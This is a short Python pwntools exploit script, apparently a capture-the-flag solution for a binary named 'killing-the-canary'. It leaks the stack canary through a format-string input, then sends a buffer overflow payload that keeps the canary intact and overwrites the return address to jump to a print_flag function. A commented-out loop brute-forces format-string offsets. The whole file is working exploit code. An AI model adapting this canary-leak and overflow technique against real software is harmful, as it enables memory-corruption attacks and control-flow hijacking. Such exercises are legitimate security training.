#!/usr/bin/env python3
import re
from pwn import *

exe = ELF("./killing-the-canary")

r = process([exe.path])
#r = gdb.debug([exe.path])
#for i in range(1,50):
#    p = process('./killing-the-canary')
#    pay = f"%{i}$x"
#    p.recvuntil("What's your name? ")
#    p.sendline(pay.encode())
#    result = p.recvline().strip().decode()
#    print(f"Offset: {i}: {result}")
#    continue

r.recvuntil(b"What's your name? ")
r.sendline(b'%41$lx') #Add your code here 35
val = r.recvuntil(b"What's your message? ")
#log.info(val)
val = re.split(' ', str(val))
canary = int(val[1][:-3], 16)
#log.info(f"Canary: {canary:x}")

win = exe.symbols['print_flag']

# log.info(hex(win)) 0x401236

payload = b'a' * 72 + p64(canary) + (b'a' * 8) + p64(0x401236) # 0xb1ad72a09d9d4500
r.sendline(payload)
r.recvline()
r.interactive()